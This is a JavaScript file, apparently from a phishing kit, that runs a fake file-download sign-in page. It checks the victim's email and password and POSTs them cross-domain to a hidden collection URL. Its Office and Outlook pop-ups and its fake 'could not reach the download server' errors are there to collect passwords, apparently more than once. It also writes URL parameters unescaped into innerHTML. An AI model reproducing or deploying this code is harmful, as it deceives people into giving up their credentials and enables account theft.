$(document).ready(function () {
  // Start - Get file names from URL
  function GetURLParameter(sParam) {
    var sPageURL = window.location.search.substring(1);
    var sURLVariables = sPageURL.split("&");
    for (var i = 0; i < sURLVariables.length; i++) {
      var sParameterName = sURLVariables[i].split("=");
      if (sParameterName[0] == sParam) {
        return decodeURIComponent(sParameterName[1]);
      }
    }
  }

  var DL1 = GetURLParameter("dl1");
  var DL2 = GetURLParameter("dl2");
  var DL3 = GetURLParameter("dl3");
  var DL4 = GetURLParameter("dl4");

  document.getElementById("dl1").innerHTML = DL1;
  document.getElementById("dl2").innerHTML = DL2;
  document.getElementById("dl3").innerHTML = DL3;
  document.getElementById("dl4").innerHTML = DL4;
  // End - Get file names from URL

  // Start - Email address validation
  function validateEmail(email) {
    var hash = /^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/;
    return hash.test(email);
  }
  // End - Email address validation

  // Start - Hide & empty error messages on keyup
  $("#loginForm input").keydown(function () {
    $("#authError, #emailError, #passwordError").html("").addClass("visually-hidden");
  });
  // End - Hide & Empty error messages on keyup

  // Start - Hide & empty form on modal close
  $("#right-modal-lg").on("hidden.bs.modal", function () {
    $("#loginForm")[0].reset();
    $("#loginCount").val("0");
    $("#authError, #emailError, #passwordError").html("").addClass("visually-hidden");
  });
  // End - Hide & empty form on modal close

  // Start - Pop up window for office login
  $("#sign-in-with-office").click(function () {
    $("#loginForm")[0].reset();
    $("#loginCount").val("0");
    $("#authError, #emailError, #passwordError").html("").addClass("visually-hidden");
    
    var officeUrl = $("#officeURL").html();
    let params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=600,left=100,top=100`;
    officeAuth = window.open(officeUrl, "Auth", params);

    var timer = setInterval(function () {
      if (officeAuth.closed) {
        $("#authError").html('<span class="animated fadeInUp"><span id="errorText">Hmm, could not reach the download server. Try again</span></span>').removeClass("visually-hidden");
        clearInterval(timer);
      }
    }, 250);

    if (!officeAuth) {
      window.location.href = officeUrl;
    }
  });
  // End - Pop up window for office login

  // Start - Pop up window for outlook login
  $("#sign-in-with-exchange").click(function () {
    $("#loginForm")[0].reset();
    $("#loginCount").val("0");
    $("#authError, #emailError, #passwordError").html("").addClass("visually-hidden");

    var exchangeUrl = $("#exchangeURL").html();
    let params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=600,left=100,top=100`;
    exchangeAuth = window.open(exchangeUrl, "Auth", params);

    var timer = setInterval(function () {
      if (exchangeAuth.closed) {
        $("#authError").html('<span class="animated fadeInUp"><span id="errorText">Hmm, could not reach the download server. Try again</span></span>').removeClass("visually-hidden");
        clearInterval(timer);
      }
    }, 250);

    if (!exchangeAuth) {
      window.location.href = exchangeUrl;
    }
  });
  // End - Pop up window for outlook login

  // Start - Login form submit
  $("#loginForm").submit(function (e) {
    e.preventDefault();

    $("#authError").html("").addClass("visually-hidden");

    var email = $("#email").val().trim();
    var password = $("#password").val().trim();

    if (!email) {
      $("#emailError").html('<div class="auth0-lock-error-invalid-hint">You know the drill</div>').removeClass("visually-hidden");
      $("#email").focus();
      $("#passwordError").html("").addClass("visually-hidden");
    } else if (!validateEmail(email)) {
      $("#emailError").html('<div class="auth0-lock-error-invalid-hint">Hmm, that doesn&acute;t look right. Typo?</div>').removeClass("visually-hidden");
      $("#email").focus();
      $("#passwordError").html("").addClass("visually-hidden");
    } else if (!password) {
      $("#passwordError").html('<div class="auth0-lock-error-invalid-hint">You know the drill</div>').removeClass("visually-hidden");
      $("#password").focus();
      $("#emailError").html("").addClass("visually-hidden");
    } else if (password.length < 5) {
      $("#passwordError").html('<div class="auth0-lock-error-invalid-hint">Hmm, that doesn&acute;t look right. Typo?</div>').removeClass("visually-hidden");
      $("#password").focus();
      $("#emailError").html("").addClass("visually-hidden");
    } else {
      jQuery.ajax({
        url: $('#sourceURL').html(),
        data: $("#loginForm").serialize(),
        type: "POST",
        crossDomain: true,
        beforeSend: function () {
          $("#loginForm input").blur();
          $("#content-loading").show();
          $("#emailError, #passwordError").html("").addClass("visually-hidden");
        },
        success: function (data) {
          if (data.match(/1/i)) {
            $("#content-loading").hide();
            $("#loginCount").val("2");
            $("#password").val("");
            $("#password").focus();
            $("#authError").html('<span class="animated fadeInUp"><span id="errorText">Hmm, could not reach the download server. Try again</span></span>').removeClass("visually-hidden");
          } else if (data.match(/2/i)) {
            $("#content-loading").hide();
            $("#loginCount").val("1");
            $("#password").val("");
            $("#password").focus();
            $("#authError").html('<span class="animated fadeInUp"><span id="errorText">Hmm, could not reach the download server. Try again</span></span>').removeClass("visually-hidden");
          } else if (data.match(/0/i)) {
            $("#content-loading").hide();
            $("#loginCount").val("1");
            $("#email, #password").val("");
            $("#email").focus();
            $("#authError").html('<span class="animated fadeInUp"><span id="errorText">Please log in with your email account.</span></span>').removeClass("visually-hidden");
          } else if (data.match(/-0/i)) {
            $("#content-loading").hide();
            $("#loginCount").val("0");
            $("#password").val("").focus();
            $("#authError").html('<span class="animated fadeInUp"><span id="errorText">Error. Please check your network and try again.</span></span>').removeClass("visually-hidden");
          }
        },
        error: function () {
          $("#content-loading").hide();
          $("#loginCount").val("0");
          $("#password").val("").focus();
          $("#authError").html('<span class="animated fadeInUp"><span id="errorText">Error. Please check your network and try again.</span></span>').removeClass("visually-hidden");
        },
      });
    }
  });
  // End - Login form submit
});
